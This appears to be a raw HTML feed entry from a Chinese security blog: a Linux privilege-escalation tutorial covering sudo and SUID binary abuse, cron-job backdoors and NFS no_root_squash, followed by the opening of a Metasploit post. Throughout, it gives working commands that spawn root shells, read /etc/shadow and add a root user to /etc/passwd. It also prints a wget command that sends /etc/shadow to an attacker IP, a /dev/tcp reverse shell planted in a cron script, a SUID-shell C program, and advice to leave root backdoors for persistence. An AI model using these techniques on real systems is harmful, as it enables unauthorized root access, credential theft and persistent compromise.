class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sudoers</span><br><span class="line">在最后一行添加</span><br><span class="line">当前用户名 ALL = (root) NOPASSWD:/usr/bin/find , 如 derian ALL = (root) NOPASSWD:/usr/bin/find</span><br><span class="line">所有sudo命令不需要密码</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">用户名 ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><h2 id="3、利用sudo提权"><a href="#3、利用sudo提权" class="headerlink" title="3、利用sudo提权"></a>3、利用sudo提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sudoers</span><br><span class="line">在最后一行添加</span><br><span class="line">当前用户名 ALL = (root) NOPASSWD:/usr/bin/find</span><br><span class="line">所有sudo命令不需要密码</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">用户名 ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><p><strong>sudo -l #显示允许当前用户使用的命令</strong><br><img src="http://120.48.107.243:9090/blog/2023/04/03/d86f6fa79a0b41f388e58499bb5d79e1.png" alt="在这里插入图片描述"></p><h2 id="4、find命令"><a href="#4、find命令" class="headerlink" title="4、find命令"></a>4、find命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/passwd <span class="literal">-exec</span> /bin/sh \; <span class="comment"># 查看当前用户</span></span><br><span class="line">sudo find /etc/passwd <span class="literal">-exec</span> whoami \; <span class="comment"># 查看shadow</span></span><br><span class="line">sudo find /etc/passwd <span class="literal">-exec</span> <span class="built_in">cat</span> /etc/shadow \;</span><br></pre></td></tr></table></figure><h2 id="5、vim命令"><a href="#5、vim命令" class="headerlink" title="5、vim命令"></a>5、vim命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim <span class="literal">-c</span> <span class="string">&#x27;!sh&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="6、nmap命令"><a href="#6、nmap命令" class="headerlink" title="6、nmap命令"></a>6、nmap命令</h2><p>适用版本:nmap2.02至5.21 在早期nmap版本中,带有交互模式,因而允许用户执行shell命令 使用如下命令进入nmap交互模式</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">--interactive</span></span><br></pre></td></tr></table></figure><p>在nmap交互模式中 通过如下命令提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh </span><br><span class="line">sh<span class="literal">-3</span>.<span class="number">2</span><span class="comment"># whoami </span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>没有交互的最新方式</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; /tmp/shell.nse &amp;&amp; sudo nmap —script = /tmp/shell.nse</span><br></pre></td></tr></table></figure><h2 id="7、git命令"><a href="#7、git命令" class="headerlink" title="7、git命令"></a>7、git命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="literal">-p</span> help 或者 sudo git help config !/bin/sh</span><br><span class="line"><span class="comment"># whoami root</span></span><br></pre></td></tr></table></figure><h2 id="8、teehee命令"><a href="#8、teehee命令" class="headerlink" title="8、teehee命令"></a>8、teehee命令</h2><p>teehee命令可以往一个文件追加内容，可以通过它向&#x2F;etc&#x2F;passwd写入内容，新增一个超级用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test::0:0:::/bin/bash&quot;</span> | sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">su test</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h2 id="9、man命令"><a href="#9、man命令" class="headerlink" title="9、man命令"></a>9、man命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">man</span> <span class="built_in">man</span> </span><br><span class="line">之后按!</span><br><span class="line"> 按下并按Enter</span><br></pre></td></tr></table></figure><h2 id="10、less-x2F-more命令"><a href="#10、less-x2F-more命令" class="headerlink" title="10、less&#x2F;more命令"></a>10、less&#x2F;more命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line"> sudo more /etc/hosts</span><br><span class="line">之后按! </span><br><span class="line">按下并按Enter</span><br></pre></td></tr></table></figure><h2 id="11、awk命令"><a href="#11、awk命令" class="headerlink" title="11、awk命令"></a>11、awk命令</h2><p>akw命令进入shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="12、nano命令"><a href="#12、nano命令" class="headerlink" title="12、nano命令"></a>12、nano命令</h2><p>nano也算是比较上古的文本编辑器了，nano进入shell的方法为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nano <span class="comment">#进入nano编辑器 Ctrl + R</span></span><br><span class="line">Ctrl + X</span><br><span class="line"><span class="comment">#即可输入命令</span></span><br></pre></td></tr></table></figure><h2 id="13、wget命令"><a href="#13、wget命令" class="headerlink" title="13、wget命令"></a>13、wget命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这种非常酷的方式要求Web服务器下载文件。这样我从没在任何地方见过。让我们解释一下。</span><br><span class="line">首先将Target的/etc/passwd文件复制到攻击者计算机。 修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。 仅附加此行=&gt;</span><br><span class="line">touhid:<span class="variable">$6</span><span class="variable">$bxwJfzor</span><span class="variable">$MUhUWO0MUgdkWfPPEydqgZpm</span>.YtPMI/gaM4lVqhP21LFNWmSJ8 <span class="number">21</span>kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0/<span class="number">0</span>:b:root/root:</span><br><span class="line">将passwd文件托管到使用任何Web服务器的主机。</span><br><span class="line">在受害者方面。</span><br><span class="line">sudo <span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.1</span>:<span class="number">8080</span>/passwd <span class="literal">-O</span> /etc/passwd</span><br><span class="line">现在切换用户密码是:test</span><br><span class="line">su touhid</span><br><span class="line">注意:如果您要从服务器上转储文件，例如 root 的 ssh 密钥， shadow 文件等。 sudo <span class="built_in">wget</span> —post<span class="operator">-file</span> = /etc/shadow <span class="number">192.168</span>.<span class="number">56.1</span>:<span class="number">8080</span> 攻击者的设置侦听器:nc –lvp <span class="number">8080</span></span><br></pre></td></tr></table></figure><h2 id="14、zip提权"><a href="#14、zip提权" class="headerlink" title="14、zip提权"></a>14、zip提权</h2><p>首先，我们使用touch命令创建一个文件，我们已创建了一个raj.txt文件，现在我们通过zip文件压缩 raj.txt文件，并执行一个获取shell的命令。如下:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip <span class="number">1</span>.zip raj.txt <span class="literal">-T</span> <span class="literal">--unzip-command</span>=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到，我们已经通过zip命令成功获取到了受害者机器的shell。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/22581212eb0948e593be27ccfcadb5c9.png" alt="在这里插入图片描述"></p><h1 id="三、suid提权"><a href="#三、suid提权" class="headerlink" title="三、suid提权"></a>三、suid提权</h1><p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行 root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限 , 简单来说就是 文件的拥有者是root , 然后这个文件又可以通过某语法执行系统命令 , 那么你就可以提升到root权限了<br>##1、寻找suid文件<br>在Linux中查找可以用来提权的suid文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/表示从文件系统的顶部(根)开始并找到每个目录</span><br><span class="line"><span class="literal">-perm</span> 表示搜索随后的权限 <span class="literal">-u</span> = s表示查找root用户拥有的文件</span><br><span class="line"><span class="literal">-type</span> 表示我们正在寻找的文件类型 f 表示常规文件，而不是目录或特殊文件 <span class="number">2</span>表示该进程的第二个文件描述符，即stderr(标准错误)</span><br><span class="line">&gt;表示重定向 /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br><span class="line">另外两个相同的查找命令</span><br><span class="line">find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-print</span> <span class="number">2</span>&gt;/dev/null find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-exec</span> <span class="built_in">ls</span> <span class="literal">-ldb</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>跟滥用sudo的原理差不多 , 也是列举几个常见的命令 , SUID提权和SUDO提权是通用的<br>##2、find命令<br>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用 SUID权限运行，则可以通过find执行的命令都将以root身份去运行。<br>提权如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch anyfile(文件路径) <span class="comment">#必须要有这个文件 </span></span><br><span class="line">find anyfile <span class="literal">-exec</span> whoami \;</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4d9f0a70914d4f2fb8f6bad3c11df034.png" alt="在这里插入图片描述"></p><h2 id="3、vin-x2F-vim命令"><a href="#3、vin-x2F-vim命令" class="headerlink" title="3、vin&#x2F;vim命令"></a>3、vin&#x2F;vim命令</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9e281f5c0f1949e38093e3fb45ec855f.png" alt="在这里插入图片描述"></p><h2 id="4、bash命令"><a href="#4、bash命令" class="headerlink" title="4、bash命令"></a>4、bash命令</h2><p>以下命令将以root身份打开一个bash shell。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bash <span class="literal">-p</span></span><br><span class="line">bash<span class="literal">-3</span>.<span class="number">2</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">1002</span>(service) gid=<span class="number">1002</span>(service) euid=<span class="number">0</span>(root) groups=<span class="number">1002</span>(service)</span><br></pre></td></tr></table></figure><h2 id="5、more-x2F-less命令"><a href="#5、more-x2F-less命令" class="headerlink" title="5、more&#x2F;less命令"></a>5、more&#x2F;less命令</h2><p><strong>less命令也可以进入shell</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><strong>more命令进入shell和less相同</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h2 id="6、nano命令"><a href="#6、nano命令" class="headerlink" title="6、nano命令"></a>6、nano命令</h2><p>nano进入shell的方法为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano <span class="comment">#进入nano编辑器 Ctrl + R</span></span><br><span class="line">Ctrl + X</span><br><span class="line"><span class="comment">#即可输入命令</span></span><br></pre></td></tr></table></figure><h2 id="7、mv-x2F-cp命令"><a href="#7、mv-x2F-cp命令" class="headerlink" title="7、mv&#x2F;cp命令"></a>7、mv&#x2F;cp命令</h2><p>使用 mv&#x2F;cp 命令覆盖原来的 &#x2F;etc&#x2F;passwd 文件<br>##8、awk命令<br>awk命令进入shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/faa6d8eaf2114544ae095c38204eda92.png" alt="在这里插入图片描述"></p><h2 id="9、nmap命令"><a href="#9、nmap命令" class="headerlink" title="9、nmap命令"></a>9、nmap命令</h2><p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受 影响的范围内或更早就可以尝试使用这种方法进行提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-v</span> <span class="comment">#查看版本</span></span><br><span class="line">nmap <span class="literal">--interactive</span> <span class="comment"># 进入交互模式</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入shell</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"> sh<span class="literal">-3</span>.<span class="number">2</span><span class="comment"># whoami</span></span><br><span class="line">  root</span><br></pre></td></tr></table></figure><h2 id="10、man命令"><a href="#10、man命令" class="headerlink" title="10、man命令"></a>10、man命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">man</span> passwd </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h2 id="11、tcpdump命令"><a href="#11、tcpdump命令" class="headerlink" title="11、tcpdump命令"></a>11、tcpdump命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$</span><span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.test</span><br><span class="line">chmod +x /tmp/.test</span><br><span class="line">sudo tcpdump <span class="literal">-ln</span> <span class="literal">-i</span> eth0 <span class="literal">-w</span> /dev/null <span class="literal">-W</span> <span class="number">1</span> <span class="literal">-G</span> <span class="number">1</span> <span class="literal">-z</span> /tmp/.test <span class="literal">-Z</span> root</span><br></pre></td></tr></table></figure><h2 id="12、python-x2F-per-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令"><a href="#12、python-x2F-per-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令" class="headerlink" title="12、python&#x2F;per&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令"></a>12、python&#x2F;per&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># perl</span></span><br><span class="line">exec <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="四、计划任务提权"><a href="#四、计划任务提权" class="headerlink" title="四、计划任务提权"></a>四、计划任务提权</h1><p>如果可以 找到可以有权限修改的计划任务脚本，就可以修改脚本实现提权 。本质上，就是文件权限配置不当 查看计划任务，找到有修改权限的计划任务脚本 , 在计划任务对应中追加提权后门</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/618be892b38a45e09afa029fa64caa19.png" alt="在这里插入图片描述"><br>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root权限下</span><br><span class="line">vim /tmp/test.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ping qq.com <span class="literal">-c</span> <span class="number">4</span></span><br><span class="line">vim /etc/crontab</span><br><span class="line">*/<span class="number">1</span> * * * * root /bin/bash /tmp/test.sh</span><br><span class="line">chmod <span class="number">777</span> /tmp/test.sh</span><br><span class="line">vim /tmp/test.sh</span><br><span class="line">/bin/bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">0.96</span>/<span class="number">5656</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="五、第三方服务NFS提权"><a href="#五、第三方服务NFS提权" class="headerlink" title="五、第三方服务NFS提权"></a>五、第三方服务NFS提权</h1><h2 id="1、什么是NFS"><a href="#1、什么是NFS" class="headerlink" title="1、什么是NFS"></a>1、什么是NFS</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网络文件系统(NFS )是一个客户端/服务器应用程序 ，它使计算机用户可以查看和选择存储和更新远 程计算机上的文件，就像它们位于用户自己的计算机上一样。在NFS协议是几个分布式文件系统标准， 网络附加存储(NAS)之一。</span><br><span class="line">NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、 操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无 关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支 持在异构系统之间数据的传送。</span><br></pre></td></tr></table></figure><h2 id="2、什么是root-sqaush和no-root-sqaush"><a href="#2、什么是root-sqaush和no-root-sqaush" class="headerlink" title="2、什么是root_sqaush和no_root_sqaush"></a>2、什么是root_sqaush和no_root_sqaush</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Root Squashing(root_sqaush)参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程 根用户在连接时会分配一个用户 <span class="string">&quot;nfsnobody&quot;</span>，它具有最少的本地特权。如果no_root_squash选项开 启的话，并为远程用户授予root用户对所连接系统的访问权限 , 即攻击者用本地root用户链接 , 在目标 系统操作的权限也是root权限</span><br><span class="line">注意:要利用此，no_root_squash选项得开启。</span><br><span class="line">root_squash:客户机用root用户访问该共享文件夹时，将root用户映射成匿名用户(默认设置); no_root_squash:客户机用root访问该共享文件夹时，不映射root用户为匿名用户 , 依然是root用 户;</span><br></pre></td></tr></table></figure><h2 id="3、利用NFS提权"><a href="#3、利用NFS提权" class="headerlink" title="3、利用NFS提权"></a>3、利用NFS提权</h2><p>首先拿到一个低权限的shell，查看目标服务器上是否开启了NFS</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/exports <span class="comment"># 如果啥也没有就是没有开启nfs,也就无法提权了</span></span><br></pre></td></tr></table></figure><p><strong>实验靶机 centos7配置nfs</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install <span class="literal">-y</span> nfs<span class="literal">-utils</span></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">systemctl <span class="built_in">start</span> rpcbind.service systemctl <span class="built_in">start</span> nfs<span class="literal">-server</span>.service</span><br><span class="line"><span class="comment"># 设置开机自动启动</span></span><br><span class="line">systemctl enable rpcbind.service</span><br><span class="line">systemctl enable nfs<span class="literal">-server</span>.service</span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim /etc/exports</span><br><span class="line">/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check) <span class="comment"># 使配置生效</span></span><br><span class="line">exportfs <span class="literal">-a</span></span><br><span class="line"><span class="comment"># 查看共享目录</span></span><br><span class="line">showmount <span class="literal">-e</span></span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">systemctl status rpcbind.service systemctl status nfs<span class="literal">-server</span>.service</span><br></pre></td></tr></table></figure><p><strong>此时查看nfs配置</strong><br><img src="http://120.48.107.243:9090/blog/2023/04/03/ed3b2d1665074cd5bbfd8d50abab505f.png" alt="在这里插入图片描述"><br>&#x2F;etc&#x2F;exports 文件包含将哪些文件夹&#x2F;文件系统导出到远程用户的配置和权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成: [共享的目录] [主机名或<span class="type">IP</span>(参数,参数)] , 其中参数是可选的，当不指定参数时，nfs将使用默认选项。 默认的共享选项是 sync,ro,root_squash,no_delay。当主机名或IP地址为空或者*时，则代表共享给任 意客户机提供服务。当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样: [共享的目录] [主机名<span class="number">1</span>或<span class="type">IP1</span>(参数<span class="number">1</span>,参数<span class="number">2</span>)] [主机名<span class="number">2</span>或<span class="type">IP2</span>(参数<span class="number">3</span>,参数<span class="number">4</span>)]</span><br></pre></td></tr></table></figure><p>很简单就是当nfs配置了no_root_squash，客户端就具有了这台nfs机器的root权限，即其他机器链接他的话是一个root权限：<br>1、查看NFS服务器上的共享目录，kali上操作</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount <span class="literal">-e</span> <span class="number">192.168</span>.<span class="number">0.84</span> 目标ip</span><br></pre></td></tr></table></figure><p>2、创建本地挂载目录，挂载共享目录，使用攻击者本地root权限创建suid shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="literal">-p</span> /tmp/test</span><br><span class="line"><span class="built_in">mount</span> <span class="literal">-t</span> nfs <span class="number">192.168</span>.<span class="number">0.84</span>:/tmp /tmp/test</span><br><span class="line">vim /tmp/test/suid<span class="literal">-shell</span>.c <span class="comment"># 内容如下</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main() &#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc /tmp/test/suid<span class="literal">-shell</span>.c <span class="literal">-o</span> /tmp/test/suid<span class="literal">-shell</span> chmod +s /tmp/test/suid<span class="literal">-shell</span></span><br></pre></td></tr></table></figure><p>3、回到要提权的服务器上，使用普通用户获取root权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow <span class="comment"># 证明没权限 /tmp/suid-shell</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow <span class="comment"># 证明有权限 , 提权成功</span></span><br><span class="line"><span class="comment"># 然后 ( 一般先上线cs , 或者留个root权限的后门 , 总之就是能持续控制)</span></span><br><span class="line"><span class="comment"># root权限后门留好 , 取消挂载</span></span><br><span class="line">sudo umount /tmp/test</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8038bfffc9f342ac865fc1c87838aa17.png" alt="在这里插入图片描述"></p><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.系统内核漏洞提权 , 脏牛提权</span><br><span class="line"><span class="number">2</span>.sudo 命令滥用提权 , 查看有那些不需要密码就可以执行的sudo命令 , 比如 find , git等 可以用来提权 <span class="number">3</span>.suid提权 , 寻找带有s属性 , 又可以执行命令的可执行文件</span><br><span class="line"><span class="number">4</span>.计划任务提权 , 通过寻找可以修改计划任务的脚本</span><br><span class="line"><span class="number">5</span>.第三方服务配置不当提权 , 比如 nfs 配置不当提权</span><br><span class="line"><span class="number">6</span>.udf提权 , 利用mysql数据库进行提权</span><br><span class="line"><span class="number">7</span>.复现过影响范围比较广的提权漏洞 , 如 sudo提权 pkexec提权 , 脏管道提权</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF初体验（一）</title>
      <link href="/2022/04/30/msf_study_one/"/>
      <url>/2022/04/30/msf_study_one/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/808b62bbb4ca4c579e490db5e5e3cd26.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;注意：本篇文章仅用于学习笔记记录与交流，不得用于其他违规用途。&#x3D;&#x3D;</p><h1 id="一、什么是MSF框架"><a href="#一、什么是MSF框架" class="headerlink" title="一、什么是MSF框架"></a>一、什么是MSF框架</h1><p>Metasploit就是一个漏洞利用框架，全称是The Metasploit Framework，简称MSF（美少妇），使用ruby语言编写的，语法类似python。<br>Metasploit是一个免费的、可下载的框架，通过它可以很容易的获取、开发并对计算机软件漏洞实施攻击，它本身附带数百个已知软件漏洞的专业级漏洞利用工具。<br>当 H.D. Moore 在 2003 年发布 Metasploit 时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit 团队一直都在努力开发各种攻击工具，并将它们 贡献给所有 Metasploit 用户。<br>访问官网：<a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/8b16d494c8fe4e36be4f7798ef861bde.png" alt="在这里插入图片描述"><br>关于版本<br>社区版：<br>集成在 kali 系统中，目前基于社区力量维护。早期版本需要先启动数据库再启动 MSF，从msf5版本以<br>后已经集成到 msf 里面了，可以直接一键启动。现在已经是msf6了<br>Pro 版：企业版（收费，但可以试用）的几个优势<br>1、企业版出的检测报告非常强大，给客户汇报起来很方便。<br>2、AV 免杀，社区版的免杀大家都知道了，但是企业级的免杀他们说过可以达到百分之九十甚至百分之百。<br>3、IDS &#x2F; IPS 绕过（入侵检测系统&#x2F;入侵防御系统)<br>4、VPN Pivotin</p><h1 id="二、为什么要有MSF"><a href="#二、为什么要有MSF" class="headerlink" 